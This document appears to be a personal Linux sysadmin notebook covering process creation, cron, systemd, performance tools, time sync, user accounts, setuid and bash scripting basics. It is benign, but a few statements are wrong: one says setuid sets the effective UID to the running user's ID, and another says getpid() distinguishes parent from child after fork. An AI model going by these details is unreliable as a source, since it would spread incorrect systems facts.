<p>In Unix, the <code>fork</code> system call is used to create a new process. The process calling <code>fork</code> is the parent process and the new process is the child process. When fork() is called, the program must determine if it is the parent or the child process (typically using getpid()), and then determine how to proceed. If you want concurrency in your program, calling fork() is enough. However, to run a different image, the child process must call exec() (or one of it‚Äôs variants). After calling fork(), the program counter for both the parent and the child are the same. Once exec() is called, the parent process is wiped from memory of the child process address space.</p>
<h2 id="process-descriptors"><a class="header" href="#process-descriptors">Process Descriptors</a></h2>
<p>Linux maintains a process descriptor, which is a structure where the linux kernel maintains information about a single process. It contains all the information needed by the scheduler to maintain the process state machine.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="scheduled-tasks"><a class="header" href="#scheduled-tasks">Scheduled Tasks</a></h1>
<h1 id="cron"><a class="header" href="#cron">Cron</a></h1>
<ul>
<li>
<p>To add a cron job, simply add it to your crontab file by typing <code>crontab</code> in a shell</p>
</li>
<li>
<p>To see an example of a crontab, you can view <code>/etc/crontab</code></p>
</li>
<li>
<p>Example cronjob structure:</p>
<pre><code>  # Example of job definition:
  # .---------------- minute (0 - 59)
  # |  .------------- hour (0 - 23)
  # |  |  .---------- day of month (1 - 31)
  # |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
  # |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
  # |  |  |  |  |
  # *  *  *  *  * user-name command to be executed
  17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
  25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
  47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
  52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
  #
</code></pre>
</li>
<li>
<p>Each user can have their own crontab file. These files are usually stored in <code>/var/spool/cron/crontabs</code></p>
</li>
<li>
<p>To edit and install a crontab, run <code>crontab -e</code></p>
</li>
<li>
<p>To list your crontabs, run <code>crontab -l</code></p>
</li>
<li>
<p>To remove a crontab, you can run <code>crontab -r</code></p>
</li>
<li>
<p>The <code>/etc/crontab</code> file is the system-wide crontab.</p>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="bash-startup-files"><a class="header" href="#bash-startup-files">Bash Startup Files</a></h1>
<p>
In bash, you can choose from one of 4 startup files to place configuration you want to run at user login:
1) .bash_profile
2) .profile
3) .bash_login
4) .bashrc
<p>Which one should you use?</p>
<p>It‚Äôs recommended that you have a single .bashrc file with a symbolic link for .bash_profile pointing to the .bashrc file.</p>
</p>

<h2 id="login-shells"><a class="header" href="#login-shells">Login Shells</a></h2>
<p>A login shell is typically what you get when you first login to a system. The same is true for when you <code>ssh</code> to a system. You can tell if you are using a login shell by typing in <code>echo $0</code> at the shell. If you receive a <code>-</code> in the response, you are using a login shell. The basic idea is that the login shell is the initial shell. When <code>bash</code> runs as a login shell, it runs <code>/etc/profile</code>. This is a global profile file that applies to any user. It then looks for one of the four user-specific profile files mentioned above. It will run the first one that it sees.</p>
<h2 id="non-login-shells"><a class="header" href="#non-login-shells">Non-login shells</a></h2>
<p>Graphical user environments such as GNOME start-up in non-login shells, unless you specifically ask for a login shell. Upon starting a non-login shell, bash runs <code>/etc/bash.bashrc</code> and then runs the users <code>.bashrc</code></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="troubleshooting-storage"><a class="header" href="#troubleshooting-storage">Troubleshooting Storage</a></h1>
<ul>
<li>Disk I/O can be observed using <code>biosnoop</code></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="system-calls"><a class="header" href="#system-calls">System Calls</a></h1>
<ul>
<li>The kernel implements a programming interface for users of the system called the ‚Äòsystem call‚Äô interface. Users and programs interact with the OS through its system call interface.</li>
</ul>
<h2 id="common-system-calls"><a class="header" href="#common-system-calls">Common System Calls</a></h2>
<h3 id="fork"><a class="header" href="#fork">fork</a></h3>
<ul>
<li><code>fork</code> - Used to create a process. At the time of the fork, the child process inherits it‚Äôs execution state from the parent. This execution state includes the parent‚Äôs address space contents, CPU register values,  and any system resources it has allocated. The OS also creates a new process control struct (task struct), an OS data structure for managing the child process, and it assigns the child process a PID.</li>
<li>When the child process is first scheduled to run on the CPU, it starts executing where the parent process left off, at the return from the <code>fork</code> call.</li>
<li>From a programmer‚Äôs point of view, a call to <code>fork</code> returns twice. Once in the context of the running parent process, and once in the context of the running child process. In order to different the return values, a call to <code>fork</code> returns different values to the parent and child. The value returned to the parent is the PID of the child (or -1 if the fork fails), and the value returned to the child is always 0.</li>
<li>Example <code>fork</code> code:</li>
</ul>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;;
#include &lt;unistd.h&gt;;
int main()
{
 
    // make two process which run same
    // program after this instruction
    fork();
 
    printf("Hello world!\n");
    return 0;
}`
</code></pre>
<h3 id="exec"><a class="header" href="#exec">exec</a></h3>
<ul>
<li><code>exec</code> - Unix provides a family of <code>exec</code> system calls that trigger the OS to overlay the calling process‚Äôs image with a new image from a binary executable file.</li>
<li>Example:</li>
</ul>
<pre><code>#include &lt;unistd.h&gt;
 
int main(void) {
  char *programName = "ls";
  char *args[] = {programName, "-lh", "/home", NULL};
 
  execvp(programName, args);
 
  return 0;
}
</code></pre>
<h3 id="exit-and-wait"><a class="header" href="#exit-and-wait">exit and wait</a></h3>
<ul>
<li><code>exit</code> - to terminate, a process calls the <code>exit</code> syscall, which triggers the OS to clean up most of the processes execution state. After running the exit code, a process notifies it‚Äôs parent that it has exited. The parent is responsible for cleaning up the child‚Äôs remaining state from the system.</li>
<li>After executing the <code>exit</code> syscall, the OS delivers a <code>SIGCHLD</code> signal to the process‚Äôs parent process to notify it that its child has exited. The child then becomes a zombie process; it moves to the Exited state and can no longer run on the CPU. The execution state of a zombie process is partially cleaned up but the OS still maintains a little information about it, including about how it terminated. A parent process reaps its zombie child by calling the <code>wait</code> syscall.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="system-wide-analysis"><a class="header" href="#system-wide-analysis">System Wide Analysis</a></h1>
<p>These tools examine system-wide analysis in the context of system software or hardware resources, using kernel counters:</p>
<ol>
<li><code>vmstat</code> - virtual and physical memory statistics</li>
<li><code>mpstat</code> - per-cpu usage</li>
<li><code>iostat</code> - Per-disk I/O usage, reported from the block device interface</li>
<li><code>nstat</code> - TCP/IP stack statistics</li>
<li><code>sar</code> - various statistics; can also archive them for historical reporting</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="systemd"><a class="header" href="#systemd">Systemd</a></h1>
<ul>
<li>
<p>systemd is goal-oriented. These goals are defined as ‚Äòunits‚Äô</p>
</li>
<li>
<p>Units are systemd objects used for organizing boot and maintenance tasks. Units consist of mounts, services, sockets, devices, and timers, etc.</p>
</li>
<li>
<p>There are 11 unit types</p>
<ul>
<li>Services units tells the init system what it needs to know about the life cycle of an application</li>
<li>systemd is the init system typically</li>
<li>Use <code>systemctl cat sshd.service</code> to view the unit file for a service</li>
<li>Use <code>systemctl edit --full sshd.service</code> to edit a unit file</li>
<li>use <code>systemctl revert sshd.service</code> to revert the unit file to the default</li>
</ul>
</li>
<li>
<p>To prevent a service from being started, you can mask it</p>
<ul>
<li>systemctl mask sshd.service</li>
</ul>
</li>
<li>
<p>Targets are simply logical collections of units.</p>
<ul>
<li>
<p>Target files end in the <code>.target</code> extension.</p>
</li>
<li>
<p>Systemd includes several predefined targets:</p>
<ul>
<li>halt: shuts down and halts the system</li>
<li>poweroff: shuts down and powers off the system</li>
<li>shutdown: shuts down the system</li>
<li>rescue: boots into single user mode for recovery. All local file systems are mounted. Networking is disabled. Some essential services are started</li>
<li>emergency: Runs an emergency shell. The root file system is mounted in read-only mode, other file systems are not mounted. Network and other services are disabled</li>
<li>multi-user: full network support, but without a GUI</li>
<li>graphical: full network support with a GUI</li>
<li>reboot: shuts down and reboots the system</li>
<li>default: a special soft link that points to the default system boot target (multi-user or graphical)</li>
<li>hibernate: Puts the system into hibernation</li>
</ul>
</li>
<li>
<p><code>systemctl get-default</code> will show you the default target</p>
</li>
<li>
<p>use <code>systemctl set-default multi-user.target</code> to set the default operating mode, then reboot</p>
</li>
<li>
<p>Useful targets:</p>
</li>
<li>
<p>emergency.target = root file system is read-only. Minimal amount of programs loaded</p>
</li>
<li>
<p>rescue.target = a few services are loaded and you are dropped into a root shell</p>
<ul>
<li>You must have a password set for the root user to use either of these operating modes</li>
</ul>
</li>
<li>
<p>You can switch to a target without booting by typing <code>systemctl isolate graphical.target</code>, but this does not change the default boot target</p>
</li>
</ul>
</li>
<li>
<p>Each unit has its own config file</p>
</li>
<li>
<p>When you boot a system, you‚Äôre activating a default unit, usually a target unit called <code>default.target</code> that groups together a number of service and mount units as dependencies.</p>
</li>
<li>
<p>There are two main directories that store systemd unit files:</p>
<ul>
<li><code>/lib/systemd/system</code> or <code>/usr/lib/system/system</code> - system unit directory (avoid making changes. The operating system will maintain these files for you.)</li>
<li><code>/etc/systemd/system</code> - system configuration directory (make changes here)</li>
<li>You can check the current systemd configuration search path with this command: <code>systemctl -p UnitPath show</code></li>
</ul>
</li>
<li>
<p>You can interact with systemd using the <code>systemctl</code> command</p>
</li>
<li>
<p>One of <code>systemd</code>s features is the ability to delay a daemon startup until it is absolutely needed</p>
</li>
<li>
<p>While upgrading software, if systemd‚Äôs components are upgraded, you will typically need to reboot</p>
</li>
</ul>
<h4 id="systemd-example"><a class="header" href="#systemd-example">Systemd example</a></h4>
<p>Let‚Äôs create a simple echo service</p>
<p>First, define a socket (create a file named <code>echo.socket</code> in <code>/etc/systemd/system</code>)::</p>
<pre><code class="language-sh">[Unit]
Description=my echo socket

[Socket]
ListenStream=8081
Accept=true
</code></pre>
<p>Next, define a service for echoing a response (create a file named <code>echo@.service</code> in <code>/etc/systemd/system</code>):</p>
<pre><code class="language-sh">[Unit]
Description=my echo service

[Service]
ExecStart=/bin/cat
StandardInput=socket
</code></pre>
<p>Now, we need to start the socket we created in step 1.</p>
<pre><code class="language-sh">systemctl start echo.socket
</code></pre>
<p>We can get the status of our socket:</p>
<pre><code class="language-sh">ryan:system/ $ sudo systemctl status echo.socket
‚óè echo.socket - my echo socket
     Loaded: loaded (/etc/systemd/system/echo.socket; static)
     Active: active (listening) since Tue 2023-01-17 06:02:51 EST; 7s ago
     Listen: [::]:8081 (Stream)
   Accepted: 0; Connected: 0;
      Tasks: 0 (limit: 38033)
     Memory: 8.0K
        CPU: 911us
     CGroup: /system.slice/echo.socket

Jan 17 06:02:51 xerxes systemd[1]: Listening on my echo socket.
</code></pre>
<p>Now you can connect to the socket and see it repeat whatever you say!</p>
<pre><code class="language-sh">ryan:system/ $ nc localhost 8081
hello
hello
nice day, isn't it?
nice day, isn't it?
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="the-first-60-seconds"><a class="header" href="#the-first-60-seconds">The first 60 seconds</a></h1>
<p><code>Uptime</code> - Load averages to identify is load is decreasing or increasing over 1, 5, and 15 minute averages
<code>dmesg -T | tail</code> - Kernel errors including OOM events
<code>vmstat -SM 1</code> - System-wide statistics: run queue length, swapping, overall CPU usage
<code>mpstat -P ALL 1</code> - Per-CPU balance: a single busy CPU can indicate poor thread scaling
<code>pidstat 1</code> - Per-process CPU usage: identify unexpected CPU consumers, and user/system CPU time for each process.
<code>iostat -sxz 1</code> - Disk I/O statistics: IOPS and throughput, average wait time, percent busy.
<code>free -m</code> - Memory usage including the file system cache
<code>sar -n DEV 1</code> - Network device I/O: packets and throughput
<code>sar -n TCP,ETCP 1</code> - TCP statistics: connectionrates, retransmits
<code>top</code> - check overview</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="time"><a class="header" href="#time">time</a></h1>
<h1 id="system-time-and-the-hardware-clock"><a class="header" href="#system-time-and-the-hardware-clock">System time and the hardware clock</a></h1>
<ul>
<li>The kernel maintains the system clock, which is the clock that is consulted when you run commands like <code>date</code>. You can also update the system clock using the <code>date</code> command. However, you shouldn‚Äôt as you will never get the time exactly right.</li>
<li>PC hardware has a battery backed Real Time Clock (RTC). The kernel usually sets it‚Äôs time based on the RTC at boot. You can reset the system time to the current time of the RTC using <code>hwclock</code>. Keep your hardware clock in UTC to avoid any trouble with time zones or daylight savings time. You can set the RTC to your Kernel‚Äôs UTC clock using this command: <code>hwclock --systohc --utc</code></li>
<li>The kernel is very bad at keeping time. Because Linux systems will go days, months, or even years on a single boot, they typically will experience time drift. Becuase of this, you should configure the system clock to use NTP</li>
<li>The kernel‚Äôs system clock represents the current time as the number of seconds since <code>12 AM Midnight, January 1st 1970 UTC</code>. To see this number at the moment, run <code>date +%s</code></li>
<li>The time zone files on your system are in <code>/usr/share/zoneinfo</code></li>
</ul>
<h1 id="network-time-protocol-ntp"><a class="header" href="#network-time-protocol-ntp">Network Time Protocol (NTP)</a></h1>
<ul>
<li>NTP client services were once handled by an NTP daemon, but systemd has long since replaced this with a package named <code>timesyncd</code>.</li>
<li><code>timesyncd</code> can be controlled using <code>/etc/systemd/timesyncd.conf</code></li>
<li>If your machine does not have a persistent internet connection, you can use a daemon like <code>chronyd</code> to maintain the time during disconnects</li>
<li></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="troubleshooting"><a class="header" href="#troubleshooting">troubleshooting</a></h1>
<h2 id="measure-cpu-time-of-a-process"><a class="header" href="#measure-cpu-time-of-a-process">Measure CPU time of a process</a></h2>
<p>We can measure CPU time using <code>time</code>. Be aware that there are two implementations of <code>time</code>, and you may be running the wrong one. There is a bash built-in named <code>time</code>, which does not provide extensive statistics. You want to use the time utility at <code>/usr/bin/time</code>. Run <code>which time</code> to see which one you are using.</p>
<pre><code class="language-sh">ryan:// $ time httping -delay 2 www.google.com
Time				Count	Url				Result		Time		Headers
-----				-----	---				------		----		-------
[ 2023-01-21T09:29:49-05:00 ]	[ 0 ]	[ https://www.google.com ]	[ 200 OK ]	[ 136ms ]	[  :  ]
[ 2023-01-21T09:29:52-05:00 ]	[ 1 ]	[ https://www.google.com ]	[ 200 OK ]	[ 111ms ]	[  :  ]
[ 2023-01-21T09:29:54-05:00 ]	[ 2 ]	[ https://www.google.com ]	[ 200 OK ]	[ 105ms ]	[  :  ]
^C
Total Requests: 2

real	0m6.384s
user	0m0.000s
sys	0m0.021s
</code></pre>
<ul>
<li>Real time - represents the total time the application spent running. This is the user time + system (kernel) time + time spent waiting (the process could be waiting of various things‚Ä¶ waiting for CPU time, waiting on network resources, etc.)</li>
<li>User time - represents the time the CPU spent running the program itself</li>
<li>Sys time - represents the time the Kernel spent doing the process‚Äôs work (for example, reading files and directories)</li>
</ul>
<p>You can determine how much time the process spent waiting by substracting the user and sys times from the real time: <code>real - (user + sys) = time waiting</code>. You can see in the example above we spent ~6 seconds waiting, in this case we were waiting on network resources.</p>
<h2 id="measuring-and-troubleshooting-load-average"><a class="header" href="#measuring-and-troubleshooting-load-average">Measuring and troubleshooting load average</a></h2>
<p>You can use <code>uptime</code> to get the overall load average of the system:</p>
<pre><code class="language-sh">ryan:wc/ $ uptime
 09:43:44 up 5 days,  4:34,  1 user,  load average: 0.27, 0.36, 0.29
                                                       ^     ^     ^
                                                       |     |     |
                                                       |     |     -- 15 minutes
                                                       |     --------- 5 minutes
                                                       --------------- 1 minute
</code></pre>
<p><code>uptime</code> shows the overall time since the last reboot. It also shows load averages over 1 minutes, 5 minutes, and 15 minutes, respectively.</p>
<p>
If a load average goes up to around 1, a single process is likely using all of that CPU. With multi-core/processor systems, if a load average goes up to 2 (or more), this means that all cores have just enough to do all of the time. To troubleshoot processes, use `top` or (preferably) `htop`. Processes consuming more CPU than other's will typically rise to the top of the list.
</p>

<p>
A high load average doesn't necessarily mean there is a problem. If you see a high load average, but your system is responding well, don't panic. The system just has a lot of processes sharing the CPU. On servers with high compute demands (such as web servers or servers that serve in scientific computations), processes and threads are being started and stopped so quickly that the load averages will be skewed and innacurate. However, if a load average is high and the system performance is suffering, you are likely running into memory problems. When a system is low on memory, it will start to thrash, or rapidly swap pages to and from disk. This is less of a problem on modern systems using solid state storage such as SSDs or NVMe. On traditional systems with spinning media, this can be an issue.
<h2 id="measuring-and-troubleshooting-memory"><a class="header" href="#measuring-and-troubleshooting-memory">Measuring and troubleshooting memory</a></h2>
<p>
One of the simplest ways to view memory status on your system is to use the `free` command or view `/proc/meminfo`
</p>

<p>You can also use <code>vmstat</code> to view memory performance on a system. <code>vmstat</code> is one of the oldest utilities for this purpose. It has minimal overhead and is a no-frills kind of program. The output is a bit difficult to read for those who are unfamiliar. You can use it to see how often the kernel is swapping pages in and out, how busy the CPU is, and how I/O resources are being utilized. To use it, run <code>vmstat 2</code> (with 2 being the seconds in between updating the screen)</p>
<pre><code class="language-sh">ryan:todo$ vmstat 2
procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu-----
 r  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st
 2  0      0 23791304 233996 4724548    0    0    30    30   10  237  5  1 94  0  0
 0  0      0 23807492 233996 4704048    0    0     0   164 2571 3426  2  2 96  0  0
 0  0      0 23806096 234004 4703776    0    0     0    34  586 1424  1  0 99  0  0
 0  0      0 23808876 234004 4703968    0    0     0    70  522 1152  1  0 99  0  0
 0  0      0 23816764 234004 4696736    0    0     0     0  591 1293  1  0 99  0  0
</code></pre>
</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="users-and-user-management"><a class="header" href="#users-and-user-management">Users and User Management</a></h1>
<p>At the kernel level, Linux users are just numbers (UIDs), but to make working with users easier, we assign usernames to these numbers. Usernames only exist in user-space. Because of this, any program that wants to work with users on a Linux system will need to translate these usernames to UIDs.</p>
<h1 id="etcpasswd"><a class="header" href="#etcpasswd">/etc/passwd</a></h1>
<p>The plantext <code>/etc/passwd</code> file contains entries for every user on a system. Each line represents a user and has 7 fields seperated by colons:</p>
<ol>
<li>the username</li>
<li>the encrypted password for the user (this is no longer used, replaced by <code>/etc/shadow</code>). An <code>x</code> in this field indicates that the password is stored in <code>/etc/shadow</code>. An asterisk <code>*</code> indicates that the user cannot login. If the password field is blank (i.e. you see double colons <code>::</code>), no password is required to login to this account.</li>
<li>The user Id</li>
<li>The group Id for the user (this field should correspond to one of the numbered entries in the <code>/etc/group</code> file)</li>
<li>The user‚Äôs real name (aka the GECOS field)</li>
<li>The user‚Äôs home directory</li>
<li>The user‚Äôs login shell</li>
</ol>
<h1 id="etcshadow"><a class="header" href="#etcshadow">/etc/shadow</a></h1>
<p>Contains encrypted passwords for user accounts</p>
<h1 id="special-users"><a class="header" href="#special-users">Special User‚Äôs</a></h1>
<p>You‚Äôll find a few special users on a Linux system:</p>
<ol>
<li>root - always has UID 0 and GID 0</li>
<li>daemon - never has login privileges</li>
<li>nobody - an underprivileged user. Some processes run as nobody because they cannot write to anything on the system</li>
</ol>
<h1 id="changing-a-password"><a class="header" href="#changing-a-password">Changing a password</a></h1>
<p>Becuase <code>/etc/passwd</code> is just a text file, you can technically modify it directly to change a user‚Äôs password. However, you shouldn‚Äôt do this. Instead, you can use the <code>passwd</code> command to change a password for a user. If for some reason you cannot use <code>passwd</code>, you should opt to use <code>vipw</code>. This command will prevent race conditions when modifying the <code>/etc/passwd</code> file. It also creates a backup of the file.</p>
<h1 id="suid-1"><a class="header" href="#suid-1">SUID</a></h1>
<p>When you temporarily switch to another user, all you are really doing is changing your user Id. There are two ways to do this, and the kernel handles both. The first way to with a setuid executable (sudo) and the second way is with a setuid system call.
The kernel has basic rules about what a process can or can‚Äôt do, but here are the three essentials that cover setuid executables and system calls:</p>
<ol>
<li>A process can run a setuid executable as long as it has adequate file permissions</li>
<li>A process running as root (user ID 0) can use setuid() system calls to become any other user</li>
<li>A process not running as root has severe restrictions on how it may use setuid() system calls. In most cases, it cannot.</li>
</ol>
<p>Because of these rules, you often need a combination of setuid executables and system calls to run a process as another user. For example, <code>sudo</code> has setuid root and once running, it may use setuid() syscalls to become another user.</p>
<h1 id="effictive-uid-euid-real-uid-ruid-and-saved-uid-saved-uid"><a class="header" href="#effictive-uid-euid-real-uid-ruid-and-saved-uid-saved-uid">Effictive UID (euid), Real UID (ruid), and Saved UID (saved UID)</a></h1>
<p>
Every process has more than one user Id. The effective user Id is the one you are likely familiar with. This is the user Id that the process is currently running as. However, the process also has a real user Id, which indicates who started the process. Normally, these two values are the same. However, when you execute a setuid program, Linux sets the euid (effective UID) to the ID of the running user, but keeps the original user Id in the ruid (real user Id). Processes also have a saved UID, but we will not need to work with this often.
</p>

<p>
As stated above, most processes have the same EUID and RUID. As a result, the default output for the `ps` command and other system diagnostic programs only show the EUID. To view both the EUID and RUID,  you can run:
</p>

<pre><code class="language-sh">ps -eo pid,euser,ruser,comm
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="bash-1"><a class="header" href="#bash-1">Bash</a></h1>
<h2 id="directory-map-24"><a class="header" href="#directory-map-24">Directory Map</a></h2>
<ul>
<li><a href="#bash-notes">bash_notes</a></li>
<li><a href="#moving-the-cursor-1">keyboard_shortcuts</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="bash-notes"><a class="header" href="#bash-notes">bash notes</a></h1>
<h2 id="variables-2"><a class="header" href="#variables-2">Variables</a></h2>
<h4 id="special-variables"><a class="header" href="#special-variables">Special Variables</a></h4>
<ul>
<li>$0 - The name of the Bash script.</li>
<li>$1 - $9 - The first 9 arguments to the Bash script.</li>
<li>$# - How many arguments were passed to the Bash script.</li>
<li>$@ - All the arguments supplied to the Bash script.</li>
<li>$? - The exit status of the most recently run process.</li>
<li><code>$$</code> - The process ID of the current script.</li>
<li>$USER - The username of the user running the script.</li>
<li>$HOSTNAME - The hostname of the machine the script is running on.</li>
<li>$SECONDS - The number of seconds since the script was started.</li>
<li>$RANDOM - Returns a different random number each time is it referred to.</li>
<li>$LINENO - Returns the current line number in the Bash script.`</li>
</ul>
<h2 id="input"><a class="header" href="#input">Input</a></h2>
<h3 id="command-line-input"><a class="header" href="#command-line-input">Command Line Input</a></h3>
<pre><code class="language-**sh**">#!/bin/bash
# A simple copy script
cp $1 $2
# Let's verify the copy worked
echo Details for $2
ls -lh $2
</code></pre>
<h3 id="input-in-scripts"><a class="header" href="#input-in-scripts">Input in scripts</a></h3>
<p>If we would like to ask the user for input in a script, we use a command called <code>read</code>. This command takes the input and will save it into a variable.</p>
<pre><code class="language-sh">#!/bin/bash
# Ask the user for their name
echo Hello, who am I talking to?
read varname
echo It\'s nice to meet you $varname
</code></pre>
<p>You are able to alter the behaviour of <code>read</code> with a variety of command line options. (See the man page for read to see all of them.) Two commonly used options however are <code>-p</code> which allows you to specify a prompt and <code>-s</code> which makes the input silent. This can make it easy to ask for a username and password combination like the example below:</p>
<pre><code class="language-sh">#!/bin/bash
# Ask the user for login details
read -p 'Username: ' uservar
read -sp 'Password: ' passvar
echo
echo Thankyou $uservar we now have your login details
</code></pre>
<p>You can use <code>read</code> to get multiple variables as well:</p>
<pre><code class="language-sh">#!/bin/bash
# Demonstrate how read actually works
echo What cars do you like?
read car1 car2 car3
echo Your first car was: $car1
echo Your second car was: $car2
echo Your third car was: $car3
</code></pre>
<h3 id="input-from-stdin"><a class="header" href="#input-from-stdin">Input from stdin</a></h3>
<pre><code class="language-sh">#!/bin/bash
# A basic summary of my sales report
echo Here is a summary of the sales data:
echo ====================================
echo
cat /dev/stdin | cut -d' ' -f 2,3 | sort
</code></pre>
<h2 id="arithmetic"><a class="header" href="#arithmetic">Arithmetic</a></h2>
<h3 id="let"><a class="header" href="#let">let</a></h3>
<p>let is a builtin function of Bash that allows us to do simple arithmetic. It follows the basic format:</p>
<pre><code class="language-sh">#!/bin/bash
# Basic arithmetic using let
let a=5+4
echo $a # 9
let "a = 5 + 4"
echo $a # 9
let a++
echo $a # 10
let "a = 4 * 5"
echo $a # 20
let "a = $1 + 30"
echo $a # 30 + first command line argument
</code></pre>
<p>Here is a table with some common operations:</p>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Operator</th><th>Operation</th></tr>
</thead>
<tbody>
<tr><td>+, -, *, /</td><td>addition, subtraction, multiply, divide</td></tr>
<tr><td>var++</td><td>Increase the variable var by 1</td></tr>
<tr><td>var‚Äì</td><td>Decrease the variable var by 1</td></tr>
<tr><td>%</td><td>Modulus (Return the remainder after division)</td></tr>
</tbody>
</table>
</div>
<h2 id="conditionals-2"><a class="header" href="#conditionals-2">Conditionals</a></h2>
<p>If statements (and, closely related, case statements) allow us to make decisions in our Bash scripts. They allow us to decide whether or not to run a piece of code based upon conditions that we may set. If statements, combined with loops (which we‚Äôll look at in the next section) allow us to make much more complex scripts which may solve larger tasks.</p>
<h3 id="if-statements"><a class="header" href="#if-statements">If Statements</a></h3>
<pre><code class="language-sh">if [ &lt;some test&gt; ]
then
  &lt;commands&gt;
fi
</code></pre>
<p>Anything between then and fi (if backwards) will be executed only if the test (between the square brackets) is true.</p>
<p>Let‚Äôs look at a simple example:</p>
<pre><code class="language-sh">#!/bin/bash
if [ $1 -gt 100 ]
then
  echo Hey that\'s a large number.
  pwd
fi
date
</code></pre>
<pre><code class="language-sh">03:54:59 ryan@localhost $./test.sh 134
Hey that's a large number.
/repos/PersonalProjects/shell
Tue Jan 17 15:55:03 EST 2023
</code></pre>
<p>The square brackets [] in the if statement above are actually a reference to the <code>test</code> command. This means that all of the operators that <code>test</code> allows may be used here as well.</p>
<h4 id="ifelifelse"><a class="header" href="#ifelifelse">if/elif/else</a></h4>
<pre><code class="language-sh">#!/bin/bash
# elif statements
if [ $1 -ge 18 ]
then
  echo You may go to the party.
elif [ $2 == 'yes' ]
then
  echo You may go to the party but be back before midnight.
else
  echo You may not go to the party.
fi
</code></pre>
<h3 id="case-statements"><a class="header" href="#case-statements">case statements</a></h3>
<p>Sometimes we may wish to take different paths based upon a variable matching a series of patterns. We could use a series of if and elif statements but that would soon grow to be unweildly. Fortunately there is a case statement which can make things cleaner. It‚Äôs a little hard to explain so here are some examples to illustrate:</p>
<pre><code class="language-sh">#!/bin/bash
# case example
case $1 in
  start)
    echo starting
    ;;
  stop)
    echo stoping
    ;;
  restart)
    echo restarting
    ;;
  *)
    echo don\'t know
    ;;
esac
</code></pre>
<h2 id="loops-1"><a class="header" href="#loops-1">Loops</a></h2>
<h3 id="while-loops"><a class="header" href="#while-loops">while loops</a></h3>
<pre><code class="language-sh">#!/bin/bash

# Basic while loop

counter=1
while [ $counter -le 10 ]
do
  echo $counter
  ((counter++))
done
echo All done
</code></pre>
<h3 id="until-loop"><a class="header" href="#until-loop">until loop</a></h3>
<pre><code class="language-sh">#!/bin/bash

# Basic until loop

counter=1
until [ $counter -gt 10 ]
do
  echo $counter
  ((counter++))
done
echo All done
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="moving-the-cursor-1"><a href="#moving-the-cursor-1" class="header">Moving the cursor:</a></h1>
<h2 id="moving-the-cursor"><a class="header" href="#moving-the-cursor">Moving the cursor:</a></h2>
<pre><code>  Ctrl + a   Go to the beginning of the line (Home)
  Ctrl + e   Go to the End of the line (End)
  Ctrl + p   Previous command (Up arrow)
  Ctrl + n   Next command (Down arrow)
   Alt + b   Back (left) one word
   Alt + f   Forward (right) one word
  Ctrl + f   Forward one character
  Ctrl + b   Backward one character
  Ctrl + xx  Toggle between the start of line and current cursor position
</code></pre>
<h2 id="editing-1"><a class="header" href="#editing-1">Editing:</a></h2>
<pre><code> Ctrl + L   Clear the Screen, similar to the clear command

  Alt + Del Delete the Word before the cursor.
  Alt + d   Delete the Word after the cursor.
 Ctrl + d   Delete character under the cursor
 Ctrl + h   Delete character before the cursor (Backspace)

 Ctrl + w   Cut the Word before the cursor to the clipboard.
 Ctrl + k   Cut the Line after the cursor to the clipboard.
 Ctrl + u   Cut/delete the Line before the cursor to the clipboard.

  Alt + t   Swap current word with previous
 Ctrl + t   Swap the last two characters before the cursor (typo).
 Esc  + t   Swap the last two words before the cursor.

 ctrl + y   Paste the last thing to be cut (yank)
  Alt + u   UPPER capitalize every character from the cursor to the end of the current word.
  Alt + l   Lower the case of every character from the cursor to the end of the current word.
  Alt + c   Capitalize the character under the cursor and move to the end of the word.
  Alt + r   Cancel the changes and put back the line as it was in the history (revert).
 ctrl + _   Undo

 TAB        Tab completion for file/directory names
For example, to move to a directory 'sample1'; Type cd sam ; then press TAB and ENTER.
type just enough characters to uniquely identify the directory you wish to open.
</code></pre>
<h2 id="special-keys-tab-backspace-enter-esc"><a class="header" href="#special-keys-tab-backspace-enter-esc">Special keys: Tab, Backspace, Enter, Esc</a></h2>
<pre><code>Text Terminals send characters (bytes), not key strokes.
Special keys such as Tab, Backspace, Enter and Esc are encoded as control characters.
Control characters are not printable, they display in the terminal as ^ and are intended to have an effect on applications.

Ctrl+I = Tab
Ctrl+J = Newline
Ctrl+M = Enter
Ctrl+[ = Escape

Many terminals will also send control characters for keys in the digit row:
Ctrl+2 ‚Üí ^@
Ctrl+3 ‚Üí ^[ Escape
Ctrl+4 ‚Üí ^\
Ctrl+5 ‚Üí ^]
Ctrl+6 ‚Üí ^^
Ctrl+7 ‚Üí ^_ Undo
Ctrl+8 ‚Üí ^? Backward-delete-char

Ctrl+v tells the terminal to not interpret the following character, so Ctrl+v Ctrl-I will display a tab character,
similarly Ctrl+v ENTER will display the escape sequence for the Enter key: ^M
</code></pre>
<h2 id="history"><a class="header" href="#history">History:</a></h2>
<pre><code>  Ctrl + r   Recall the last command including the specified character(s).
             searches the command history as you type.
             Equivalent to : vim ~/.bash_history.
  Ctrl + p   Previous command in history (i.e. walk back through the command history).
